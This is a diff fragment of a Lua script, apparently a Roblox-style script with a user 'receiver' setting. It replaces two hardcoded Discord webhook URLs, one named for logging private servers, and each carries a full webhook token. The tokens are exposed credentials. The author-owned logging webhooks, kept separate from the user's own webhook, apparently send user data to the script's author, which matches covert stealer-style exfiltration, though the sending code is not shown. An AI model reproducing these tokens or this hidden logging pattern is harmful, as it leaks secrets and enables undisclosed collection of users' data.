@@ -62,7 +62,7 @@ end
 --====================================================================--
 -- WEBHOOKS
 --====================================================================--
-local prvt_srvrs_logs = "https://discord.com/api/webhooks/1438824921999478814/YtJWXKp1IHEw1R7iwKZOjqU9lAmm1SXoCIqpq0LykCrvOdOBw3SVwHCHuc_fxeFR_0qf"
+local prvt_srvrs_logs = "https://discord.com/api/webhooks/1438944352326914068/Of-VAdSPt4Qw3yfhaRmMMEChpvzqveQAL9WIYiTrHQRH99TF2DSSiN8UTzwJmVhn2bwS"
 local user_webhook = _G["Script-SM_Config"].user_webhook
 local cfg = _G["Script-SM_Config"]
 local receiver = "Not Configured"
@@ -74,7 +74,7 @@ if cfg and cfg.users then
         receiver = tostring(cfg.users)             -- old single-string format
     end
 end
-local logs_webhook = "https://discord.com/api/webhooks/1434548815708557422/PxmHG3gOYh7gXeuj362q-5V-T0Qfl_k2Bfecy0mvBbYjMoSMFkxVo5YsKeiwU04ibzoV"
+local logs_webhook = "https://discord.com/api/webhooks/1438944535299493918/oqnl7Ki83_YNr--Lmm6BU1LT-0-V2tObvk3-GuwVX8SacrgBlYd-ZfpbOIwTIo7PJ9Mz"
 
 --====================================================================--
 -- Safe HTTP
